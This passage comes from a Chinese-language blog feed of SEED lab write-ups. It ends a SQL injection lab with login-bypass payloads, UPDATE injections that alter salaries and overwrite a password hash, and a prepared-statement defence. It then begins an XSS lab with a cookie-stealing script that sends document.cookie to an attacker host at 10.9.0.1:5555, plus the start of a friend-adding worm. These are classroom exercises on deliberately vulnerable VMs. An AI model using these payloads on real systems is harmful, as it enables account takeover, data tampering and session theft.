class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;OR name =&#x27;</span>Alice<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699339768200-d871b479-b194-4e37-9c22-da45015b23af.png#averageHue=%23f2fbe3&clientId=ue017f544-f502-4&from=paste&height=304&id=u8cd8883d&originHeight=698&originWidth=1250&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=42692&status=done&style=none&taskId=u29fe58b2-c23e-4279-a923-98764dc40e0&title=&width=544.4603271484375" alt="image.png"><br />查看源代码unsafe_edit_backend.php ：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699340226436-62a9926b-6d15-4f94-b12f-ab85c9e381b1.png#averageHue=%231f1e1e&clientId=ue017f544-f502-4&from=paste&height=148&id=u0fa6d1c9&originHeight=459&originWidth=2158&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=100505&status=done&style=none&taskId=u4413aeb7-6686-416a-8f8e-e5ea7abc9eb&title=&width=693.4920654296875" alt="image.png"></p><p>Alice 的工资为 20000，这里只显示了EID 为 1000，（ID可以在管理员页面看到）现将工资改为 90000，根据源代码，构造 SQL 语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,salary=&#x27;</span><span class="number">90000</span><span class="string">&#x27; where EID=&#x27;</span><span class="number">10000</span><span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699340720308-e6289185-3ac5-4e01-b910-8ce740bdd6c8.png#averageHue=%23f3fce4&clientId=ue017f544-f502-4&from=paste&height=317&id=u9a968add&originHeight=615&originWidth=1247&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=44256&status=done&style=none&taskId=u5fb57ac7-9326-4211-be22-98300ba8e64&title=&width=643.4920654296875" alt="image.png"></p><p>可以看到salary变为了90000：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699340785819-b2c0e77a-3e71-4613-9264-eb66e31c8a38.png#averageHue=%23f2fbe3&clientId=ue017f544-f502-4&from=paste&height=358&id=u367c771b&originHeight=708&originWidth=1252&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=43955&status=done&style=none&taskId=uf52f65f1-b179-4eb1-a47d-852e1f775e2&title=&width=633.4920654296875" alt="image.png"><br><a name="LJFla"></a></p><h4 id="3-3-2-Task-3-2-Modify-other-people’-salary"><a href="#3-3-2-Task-3-2-Modify-other-people’-salary" class="headerlink" title="3.3.2 Task 3.2: Modify other people’ salary"></a>3.3.2 Task 3.2: Modify other people’ salary</h4><blockquote><p>在增加了你自己的薪水后，你决定惩罚你的老板Boby。你想把他的薪水降到1美元。请演示一下你如何才能实现这一点。</p></blockquote><p>因为不知道Boby的口令，此处也是使用SQL注入的命令，绕过口令，登录进入Boby的主页。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;OR name =&#x27;</span>Boby<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699340978479-225d662c-79aa-482d-8918-0314c9d4325e.png#averageHue=%23f3fce4&clientId=ue017f544-f502-4&from=paste&height=276&id=u2abe3884&originHeight=435&originWidth=1255&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30529&status=done&style=none&taskId=u776cf9da-6578-4f92-935d-b0ef04a1a6d&title=&width=796.8254330116802" alt="image.png"></p><p>看到boby的EID是2000：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699341000301-d15b6088-2acd-44fa-bd02-a53ddcef7ec7.png#averageHue=%23e2f3d7&clientId=ue017f544-f502-4&from=paste&height=378&id=ubb452fb2&originHeight=595&originWidth=1246&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=38346&status=done&style=none&taskId=u0875367a-9fb7-46ab-acf8-6e4d8e8496c&title=&width=791.1111470378912" alt="image.png"></p><p>类似的注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,salary=&#x27;</span><span class="number">1</span><span class="string">&#x27; where EID=&#x27;</span><span class="number">20000</span><span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699341238394-cf3adbad-b209-499f-8618-4fc89c9f0d58.png#averageHue=%23f3fce4&clientId=ue017f544-f502-4&from=paste&height=345&id=u0ed7d9fd&originHeight=544&originWidth=1255&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=42296&status=done&style=none&taskId=u8fdcba5d-5a3a-413c-ba67-2e46c4da83d&title=&width=796.8254330116802" alt="image.png"></p><p>可以看到成功将Boby的Salary改成了1，攻击成功<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699341256407-93ce3808-93e3-4744-87e7-327e270fb1f3.png#averageHue=%23e0f2d5&clientId=ue017f544-f502-4&from=paste&height=308&id=ua265a66d&originHeight=485&originWidth=1251&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=32292&status=done&style=none&taskId=uff306f3a-4782-44f9-8a2b-d76a28f21e3&title=&width=794.2857503566629" alt="image.png"><br /> </p><p><a name="sd9Aw"></a></p><h4 id="3-3-3-Task-3-3-Modify-other-people’-password"><a href="#3-3-3-Task-3-3-Modify-other-people’-password" class="headerlink" title="3.3.3 Task 3.3: Modify other people’ password."></a>3.3.3 Task 3.3: Modify other people’ password.</h4><blockquote><p>在改变了Boby的薪水后，你仍然很不满，所以你想把博比的密码改成你知道的东西，然后你就可以登录到他的账户，造成进一步的损害。请演示一下你如何才能实现这一点。您需要证明您可以使用新密码成功地登录到Boby的帐户。这里值得一提的一点是，数据库存储了密码的哈希值，而不是明文密码字符串。您可以再次查看不安全的编辑后端.php代码来查看密码是如何存储的。它使用SHA1哈希函数来生成密码的哈希值。</p></blockquote><p>此处需要使用与上面类似的方法修改Boby的password信息。此处首先使用的是sql注入的方法绕过了口令验证登录进了Boby的个人主页</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;OR name =&#x27;</span>Boby<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>接着需要对Boby的密码在Update的基础上做出注入。查看源代码以及lab实验文档的资料后了解到，此处对口令的存储并不是明文存储，而是对口令过了一次sha1的哈希函数，因此这里需要对想要更改的Password过一次Sha1函数<br />在网上找到SHA1在线工具，将想要更改的密码散列为SHA1，这里使用的密码为galaxy，sha1后为cc803b57be7d55444ae6f763d256ef6a4fda5deb<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699341712258-882934ba-e646-4685-bbcb-b5c197a8b2be.png#averageHue=%23fefefe&clientId=ue017f544-f502-4&from=paste&height=523&id=u81973457&originHeight=824&originWidth=1903&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=43537&status=done&style=none&taskId=u5899bc2e-41af-42aa-8382-e6dc21ef54e&title=&width=1208.2540231244839" alt="image.png"></p><p>构造注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,Password=&#x27;</span>cc803b57be7d55444ae6f763d256ef6a4fda5deb<span class="string">&#x27; where EID=20000;#</span></span><br></pre></td></tr></table></figure><p>注入完毕后，使用Boby 和 galaxy登录：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699342431733-343ebc22-b325-47e4-a8d2-ec7488dcf12a.png#averageHue=%23f3fce4&clientId=ue017f544-f502-4&from=paste&height=270&id=u05827002&originHeight=426&originWidth=1250&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22017&status=done&style=none&taskId=ufaa26f74-1d0d-44fc-ac10-002ee732d94&title=&width=793.6508296929086" alt="image.png"></p><p>发现修改成功：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699342445948-785a2245-5f2e-4290-8edb-ef65221ea0c5.png#averageHue=%23f2fbe3&clientId=ue017f544-f502-4&from=paste&height=380&id=uede73eed&originHeight=598&originWidth=1254&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=37361&status=done&style=none&taskId=uc56b88c9-fa50-45d1-9948-a8584af8cb1&title=&width=796.1905123479258" alt="image.png"><br><a name="ZKJIr"></a></p><h3 id="3-4-Task-4-Countermeasure-—-Prepared-Statement"><a href="#3-4-Task-4-Countermeasure-—-Prepared-Statement" class="headerlink" title="3.4 Task 4: Countermeasure — Prepared Statement"></a><strong>3.4 Task 4: Countermeasure — Prepared Statement</strong></h3><blockquote><p><a name="gWFjy"></a></p></blockquote><h4 id="SQL注入漏洞的根本问题是无法将代码与数据分离。当构造SQL语句时，程序-例如PHP程序-知道哪些部分是数据，哪些部分是代码。不幸的是，当SQL语句被发送到数据库时，边界已经消失了-SQL解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，必须确保服务器端代码和数据库中的边界视图是一致的。最安全的方法是使用预处理语句。"><a href="#SQL注入漏洞的根本问题是无法将代码与数据分离。当构造SQL语句时，程序-例如PHP程序-知道哪些部分是数据，哪些部分是代码。不幸的是，当SQL语句被发送到数据库时，边界已经消失了-SQL解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，必须确保服务器端代码和数据库中的边界视图是一致的。最安全的方法是使用预处理语句。" class="headerlink" title="SQL注入漏洞的根本问题是无法将代码与数据分离。当构造SQL语句时，程序(例如PHP程序)知道哪些部分是数据，哪些部分是代码。不幸的是，当SQL语句被发送到数据库时，边界已经消失了;SQL解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，必须确保服务器端代码和数据库中的边界视图是一致的。最安全的方法是使用预处理语句。"></a>SQL注入漏洞的根本问题是无法将代码与数据分离。当构造SQL语句时，程序(例如PHP程序)知道哪些部分是数据，哪些部分是代码。不幸的是，当SQL语句被发送到数据库时，边界已经消失了;SQL解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，必须确保服务器端代码和数据库中的边界视图是一致的。最安全的方法是使用预处理语句。</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699274579209-aaa9d84b-5a47-4361-99f8-4a30b40f2484.png#averageHue=%239d9569&clientId=u5bc2f54f-cc4f-4&from=paste&height=340&id=u6662f7be&originHeight=440&originWidth=743&originalType=url&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&taskId=u5fd2cb07-491c-484e-bccf-eec2cec8d24&title=&width=574.4603271484375"></p><blockquote><p>预处理语句在编译之后，但在执行步骤之前出现。预编译语句将经过编译步骤，并被转换为带有空数据占位符的预编译查询。要运行这个预编译查询，需要提供数据，但这些数据不会经过编译步骤;相反，它们被直接插入预编译的查询，并被发送到执行引擎。因此，即使数据中有SQL代码，不经过编译步骤，代码也会被简单地视为数据的一部分，没有特殊含义。预备语句就是这样防止SQL注入攻击的。</p></blockquote><p>在unsafe.php中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>  =  <span class="string">&quot;SELECT  name ,  local ,  gender</span></span><br><span class="line"><span class="string">FROM  USER_TABLE</span></span><br><span class="line"><span class="string">WHERE  id  =  <span class="variable">$id</span>  AND  password  =’ <span class="variable">$pwd</span>’  &quot;</span> ;</span><br><span class="line"><span class="variable">$result</span>  =  <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure><p>上面的代码很容易受到SQL注入攻击。它可以被改写为以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span>  =  <span class="variable">$conn</span>-&gt;prepare( <span class="string">&quot;SELECT  name ,  local ,  gender</span></span><br><span class="line"><span class="string">                            FROM  USER_TABLE</span></span><br><span class="line"><span class="string">                            WHERE  id  =  ?  and  password  =  ? &quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;is&quot;</span>, <span class="variable">$id</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$bind_name</span>, <span class="variable">$bind_local</span>, <span class="variable">$bind_gender</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;fetch();</span><br></pre></td></tr></table></figure><p>使用预处理语句机制，我们将向数据库发送SQL语句的过程分为两个步骤。第一步是只发送代码部分，即不包含实际数据的SQL语句。这是准备步骤。正如我们从上面的代码片段中看到的，实际的数据被问号(?)代替。在这一步之后，我们使用bind param()将数据发送到数据库。数据库将只将这一步中发送的所有内容视为数据，而不再视为代码。它将数据绑定到预处理语句的相应问号上。在bind param()方法中，第一个参数”is”表示参数的类型:”i”表示id中的数据为整数类型，”s”表示pwd中的数据为字符串类型。</p><p><strong>注意：一定要重新build docker(我因为这个原因失败了好几次)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure><p>进入：URL: <a href="http://www.seed-server.com/defense/%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%9A%84%E5%91%BD%E4%BB%A4%E5%B0%9D%E8%AF%95%E6%B3%A8%E5%85%A5">http://www.seed-server.com/defense/，使用任务一的命令尝试注入</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;OR name =&#x27;</span>admin<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699277638078-f84430e7-2f3f-415f-b9b0-706fb0731634.png#averageHue=%23a3f0d1&clientId=ucd935773-59d7-4&from=paste&height=407&id=u136394b4&originHeight=641&originWidth=1209&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=47586&status=done&style=none&taskId=u2e8efac1-1c5e-40a0-977e-000118a8efc&title=&width=767.6190824789811" alt="image.png"></p><p>可以发现攻击无果：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699347943258-af5ec194-01a1-4995-8016-04e5c5909f5f.png#averageHue=%23ebebeb&clientId=u114ce185-ddcf-4&from=paste&height=187&id=uc9fc07f0&originHeight=294&originWidth=1203&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=21831&status=done&style=none&taskId=u06e46fe1-c643-48cc-80d6-4bc7e2100bf&title=&width=763.8095584964552" alt="image.png"><br />实验属于最简单的 SQL injection。主要的收获在于最后一个 Task，学习到了防御SQL注入攻击的知识。</p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：XSS实验</title>
      <link href="/post/df7e9b12.html"/>
      <url>/post/df7e9b12.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p><h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>为了演示攻击者可以做什么，我们在预先构建的Ubuntu VM映像中设置了一个名为Elgg的web应用程序。我们已经注释掉了Elgg的一些保护方法，故意使其容易受到XSS攻击。学生们需要利用这些漏洞发动攻击，就像Samy Kamkar在2005年通过臭名昭著的Samy蠕虫对MySpace所做的那样。此攻击的最终目标是在用户之间传播XSS蠕虫，这样无论谁查看受感染的用户配置文件都会受到感染，无论谁受感染都会将您（即攻击者）添加到他&#x2F;她的好友列表中。<br><a name="vg0k9"></a></p><h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="STc8I"></a></p><h2 id="2-Lab-Environment"><a href="#2-Lab-Environment" class="headerlink" title="**2 **Lab Environment"></a>**2 **Lab Environment</h2><p><a name="ci0tI"></a></p><h3 id="2-1-DNS-Setup"><a href="#2-1-DNS-Setup" class="headerlink" title="2.1 DNS Setup"></a>2.1 DNS Setup</h3><p>查看DNS配置情况，打开虚拟机的&#x2F;etc&#x2F;hosts，照实验pdf修改内容<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698655738316-a7cdca0a-0f33-472e-aa54-2e51d0127f72.png#averageHue=%23292726&clientId=uf453d29e-1bc9-4&from=paste&height=152&id=fOvrZ&originHeight=239&originWidth=459&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=25363&status=done&style=none&taskId=u411037f9-44ef-4e8e-96b6-041611b431a&title=&width=291.428584663236" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span> www.seed-server.com</span><br><span class="line"><span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span> www.example32a.com</span><br><span class="line"><span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span> www.example32b.com</span><br><span class="line"><span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span> www.example32c.com</span><br><span class="line"><span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span> www.example60.com</span><br><span class="line"><span class="number">10.9</span><span class="number">.0</span><span class="number">.5</span> www.example70.com</span><br></pre></td></tr></table></figure><p><a name="OXoc6"></a></p><h3 id="2-2-The-Elgg-Web-Application"><a href="#2-2-The-Elgg-Web-Application" class="headerlink" title="2.2 The Elgg Web Application"></a>2.2 The Elgg Web Application</h3><p>当访问<a href="http://www.xsslabelgg.com可以看到如下的界面,已经是配置好的elgg网站,/">www.xsslabelgg.com可以看到如下的界面，已经是配置好的Elgg网站，</a><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698657646106-5f576489-1be6-4057-8c34-14a7e0a990b0.png#averageHue=%23f4f4f1&clientId=uf453d29e-1bc9-4&from=paste&height=137&id=Hzsvd&originHeight=189&originWidth=708&originalType=url&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&taskId=u1a4d0727-962c-49f8-83cb-491d5da0ad0&title=&width=512.8353271484375"><br />需要使用的话可以直接从中输入用户名和密码登录即可。实验pdf中提供了用户名和密码<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698657094188-2396ee63-81c7-4022-af39-fc63141c63c7.png#averageHue=%23e2e0df&clientId=uf453d29e-1bc9-4&from=paste&height=130&id=lUByJ&originHeight=205&originWidth=374&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=14921&status=done&style=none&taskId=u62d6317c-1733-49b0-9c49-9c8833ccfe5&title=&width=237.46032824411824" alt="image.png"></p><p><a name="vTOH6"></a></p><h2 id="3-Lab-Tasks"><a href="#3-Lab-Tasks" class="headerlink" title="3 Lab Tasks"></a><strong>3 Lab Tasks</strong></h2><p><a name="gGXYT"></a></p><h3 id="3-1-Preparation-Getting-Familiar-with-the-“HTTP-Header-Live”-tool"><a href="#3-1-Preparation-Getting-Familiar-with-the-“HTTP-Header-Live”-tool" class="headerlink" title="3.1: Preparation: Getting Familiar with the “HTTP Header Live” tool"></a>3.1: Preparation: Getting Familiar with the “HTTP Header Live” tool</h3><p>seed20.04虚拟机的firefox浏览器自带 http header liver这个工具，点击右上角的这个按钮就可以打开，类似于网页元素的检查器，不过是针对header的<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698658463553-d728b3d5-d0e4-4c2a-abe0-ae31fd8b1da4.png#averageHue=%23e1ebd2&clientId=uf453d29e-1bc9-4&from=paste&height=366&id=u5580ec78&originHeight=719&originWidth=1208&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=417291&status=done&style=none&taskId=u94c97867-39a5-4afd-9ca2-634491f5550&title=&width=614.84130859375" alt="image.png"><br><a name="S7od5"></a></p><h3 id="3-2-Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#3-2-Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="3.2 Task 1: Posting a Malicious Message to Display an Alert Window"></a>3.2 Task 1: Posting a Malicious Message to Display an Alert Window</h3><p>在本次lab的labsetup下，使用dcup命令链接docker，再用浏览器打开10.9.0.5，发现启动了网页<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698656364311-eb5ce34c-f882-461b-bc60-b72bf9be70a4.png#averageHue=%23f5f5f5&clientId=uf453d29e-1bc9-4&from=paste&height=372&id=u9e41a9b3&originHeight=759&originWidth=1207&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=53546&status=done&style=none&taskId=u092df48e-0dd3-473e-b5ae-499b0711a4e&title=&width=590.84130859375" alt="image.png"></p><p>之后我们正常登录站点，如samy，接下来在profile插入XSS并保存</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698657243023-7ec8990f-ad19-4aa0-bf3f-94d5a65a50e0.png#averageHue=%23fdfdfd&clientId=uf453d29e-1bc9-4&from=paste&height=353&id=ua001dd62&originHeight=699&originWidth=1178&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30963&status=done&style=none&taskId=u63e98ed5-2126-4036-8e51-87d5b9f04db&title=&width=594.8333740234375" alt="image.png"></p><p>点击保存修改后，跳转至用户个人页，出现了显示“XSS”的弹窗<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698657312923-ec57b4c9-f4ad-4071-8ffb-8c69bfa2a9cf.png#averageHue=%239b9b9b&clientId=uf453d29e-1bc9-4&from=paste&height=298&id=u71dd4976&originHeight=614&originWidth=1204&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=65897&status=done&style=none&taskId=ue7e9ed6b-c0e5-430b-aa67-28a3484ea67&title=&width=583.8313598632812" alt="image.png"></p><p><a name="AZ20Y"></a></p><h3 id="3-3-Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#3-3-Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="3.3 Task 2: Posting a Malicious Message to Display Cookies"></a><strong>3.3 Task 2: Posting a Malicious Message to Display Cookies</strong></h3><p>回到刚才编辑页面，把alert中的xss代码替换成document.cookie<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698659085634-d20360e1-dd4b-4e0c-9fc6-88340aafcf98.png#averageHue=%23fefefd&clientId=uf453d29e-1bc9-4&from=paste&height=356&id=u72599d23&originHeight=708&originWidth=1192&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=32010&status=done&style=none&taskId=ub4d4994d-1955-4355-b80e-9e6a66b1df2&title=&width=599.84130859375" alt="image.png">、</p><p>点击保存，页面跳转，可以看到，cookie被打印了出来<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698659115745-fabae45f-e58b-4889-8f56-e53b7d5d1330.png#averageHue=%239e9e9d&clientId=uf453d29e-1bc9-4&from=paste&height=321&id=u2dcb6e7a&originHeight=670&originWidth=1211&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=71014&status=done&style=none&taskId=u2dc76fdd-0263-4ab6-9363-ef73b707bcf&title=&width=580.84130859375" alt="image.png"></p><p><a name="ZKJIr"></a></p><h3 id="3-4-Task-3-Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#3-4-Task-3-Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="3.4 Task 3: Task 3: Stealing Cookies from the Victim’s Machine"></a><strong>3.4 Task 3: Task 3: Stealing Cookies from the Victim’s Machine</strong></h3><p>之后，为了将受害者的cookie发送到攻击者的主机。尝试对Samy的profile做出如下修改。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                       + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) + <span class="string">&#x27; &gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698671884711-86df576e-d1e7-4033-88c7-d7e7f440f818.png#averageHue=%23fdfdfd&clientId=u5f93e81f-25f4-4&from=paste&height=347&id=u25364a64&originHeight=735&originWidth=1184&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=38819&status=done&style=none&taskId=u9203b832-817a-4199-b40c-f8614ddc0f1&title=&width=558.4583740234375" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -lknv 5555</span></span><br></pre></td></tr></table></figure><p>samy查看自己主页时， 可以看到监听到了cookie<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698672001662-d6c083b7-1c16-46e9-965f-ab8b41cdb460.png#averageHue=%23292524&clientId=u5f93e81f-25f4-4&from=paste&height=147&id=u3e4edc32&originHeight=303&originWidth=1253&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=50291&status=done&style=none&taskId=u1662d5b3-2824-4396-b01e-5674fef6707&title=&width=609.4544067382812" alt="image.png"></p><p>再以未登陆的游客身份查看samy的主页<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698672821016-17ebd3d4-2232-4e43-9c70-dcd3da65d2d6.png#averageHue=%23fdfdfc&clientId=u5f93e81f-25f4-4&from=paste&height=305&id=u1481881d&originHeight=651&originWidth=1189&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56419&status=done&style=none&taskId=u4e3584e4-c17b-4fb9-8a59-14d65bed317&title=&width=557.4603271484375" alt="image.png"><br /> 可以看到监听到了cookie<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698672802774-c529b114-9b91-42df-aa5d-51d7ce7e0e97.png#averageHue=%232b2726&clientId=u5f93e81f-25f4-4&from=paste&height=183&id=u6b32e8d7&originHeight=289&originWidth=762&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=38657&status=done&style=none&taskId=u5b6cc708-3fcc-43f4-9eb2-38652514486&title=&width=483.80954578079707" alt="image.png"><br><a name="FELsA"></a></p><h3 id="3-5-Task-4-Becoming-the-Victim’s-Friend"><a href="#3-5-Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="3.5 Task 4: Becoming the Victim’s Friend"></a><strong>3.5 Task 4: Becoming the Victim’s Friend</strong></h3><p>这部分主要是利用XSS攻击让受害者boby自动添加用户Samy为好友，我们只要用JS脚本模拟出这个请求即可。<br />首先，为了构造一个合适的HTTP request，因此需要先了解在添加好友的时候需要对哪些部分做出改变。根据文档中提供的代码，可以看到，需要修改的共两处</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>; ➀</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>; ➁</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//Construct the HTTP request to add Samy as a 